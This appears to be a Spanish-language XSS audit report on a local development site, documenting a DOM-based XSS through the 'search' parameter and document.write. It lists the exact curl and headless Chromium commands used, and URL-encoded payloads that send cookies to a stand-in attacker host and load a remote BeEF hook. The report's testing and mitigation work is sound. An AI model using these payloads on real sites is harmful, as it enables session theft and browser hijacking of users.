# Informe de Auditoría XSS — web.dev.local:8082

Resumen ejecutivo:
- Objetivo: Evaluar vulnerabilidades Cross-Site Scripting (XSS) en http://web.dev.local:8082
- Resultado: Se identificó y confirmó una vulnerabilidad DOM-based XSS que permite la ejecución de código JavaScript controlado por un atacante a través del parámetro GET `search`.

Hallazgos:
1) Vulnerabilidad: DOM-based XSS (client-side)
   - URL vulnerable: http://web.dev.local:8082/?search=<payload>
   - Punto de entrada: Parámetro GET `search` (obtenido por `new URLSearchParams(window.location.search).get('search')`)
   - Sinks: document.write() con concatenación directa: document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>')
   - Evidencia: El código cliente inserta sin sanitizar el contenido de `search` en el DOM mediante document.write(), permitiendo inyección de HTML/JS.

Pruebas realizadas (comandos exactos):
- Conectividad y pruebas básicas (curl):
  - curl -s -I -m 10 http://web.dev.local:8082
  - curl -s -G --max-time 10 --data-urlencode "q=<script>alert(1)</script>" "http://web.dev.local:8082"
  - curl -s "http://web.dev.local:8082/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
  - curl -s -H "User-Agent: XSS-TEST-<script>alert(UA)</script>" -H "Referer: http://evil/?r=<script>alert(R)</script>" http://web.dev.local:8082

- Enumeración y extracción de inputs (homepage analysis):
  - curl -s http://web.dev.local:8082 -o /tmp/homepage.html
  - grep/sed used to list form inputs and actions (ver archivo HTML extraído)

- Confirmación de DOM XSS mediante navegador headless (Chromium --dump-dom):
  - Payload usado para confirmación (codificado en URL): %3Cscript%3Edocument.title%3D%22XSS_OK%22%3C%2Fscript%3E
  - Comando ejecutado (ejemplo): chromium --headless --disable-gpu --no-sandbox --dump-dom "http://web.dev.local:8082/?search=%3Cscript%3Edocument.title%3D%22XSS_OK%22%3C%2Fscript%3E" --virtual-time-budget=5000
  - Resultado observado: el DOM renderizado por Chromium contenía <title>XSS_OK</title> y la sección result mostró la inserción del payload dentro del <strong> indicando ejecución/interpretación por el motor JS.

Explotación (simulación activa):
- Objetivo de explotación: Demonstar robo de cookies / exfiltración de tokens y posible hooking de BeEF.
- Payloads de explotación (ofuscados/evadiendo filtros):
  1) Exfiltrar cookies a servidor atacante:
     - %3Cimg%20src%3D%22x%22%20onerror%3D%22fetch(%5C'http%3A%2F%2Fatacante.example%2F%3Fc%3D%27%2BencodeURIComponent(document.cookie)%5C')%22%3E
     - Descripción: crea una imagen inválida que, al fallar, ejecuta fetch() enviando document.cookie a atacante.example.

  2) Hook de BeEF (simulado):
     - %3Cscript%20src%3D%22http%3A%2F%2Fatacante.example%3A3000%2Fhook.js%22%3E%3C%2Fscript%3E
     - Descripción: inyecta etiqueta script que carga el hook remoto; si el host atacante está disponible, el hook se ejecutaría en el navegador víctima.

- Ejecución en entorno controlado: Se usó Chromium Headless para renderizar la página con payloads; la confirmación de ejecución se observó mediante cambios en el DOM (título) y la inclusión del payload en la salida HTML tras renderizado.
- Nota: la exfiltración real hacia un servidor externo no se llevó a cabo contra hosts externos en este laboratorio; los payloads y la prueba con headless Chrome demuestran que, si un usuario visitara la URL en su navegador, el JavaScript se ejecutaría y podría realizar exfiltración.

Impacto:
- Impacto potencial: Robo de cookies de sesión, tokens almacenados en localStorage/sessionStorage, ejecución de acciones con privilegios del usuario, posibilidad de integrar hooks de BeEF para control de navegador.
- Severidad: Alta (vulnerabilidad remota, explotación trivial por envío de link malicioso a víctimas).

Mitigaciones recomendadas:
1) Evitar usar document.write() con datos de usuario; en su lugar, usar textContent o innerText para insertar texto de forma segura.
2) Escapar/sanitizar cualquier dato proveniente de URLSearchParams antes de insertarlo en el DOM. Por ejemplo: element.textContent = searchTerm; en vez de document.write.
3) Implementar Content Security Policy (CSP) restrictivo para prevenir carga de scripts de terceros y mitigación de exfiltración.
4) Validación adicional en cliente y, cuando aplique, en servidor para params que modifiquen DOM.

Anexos (salida de comandos, muestras de HTML renderizado y payloads usados) se han guardado en el directorio /app/reports para revisión.

Conclusión:
- Se confirma una vulnerabilidad DOM-based XSS en el parámetro `search`. Se logró ejecutar código JavaScript en un navegador headless demostrando la explotación (ej. cambio de título). Recomiendo corregir la inserción insegura y añadir CSP urgentemente.

-- Fin del informe
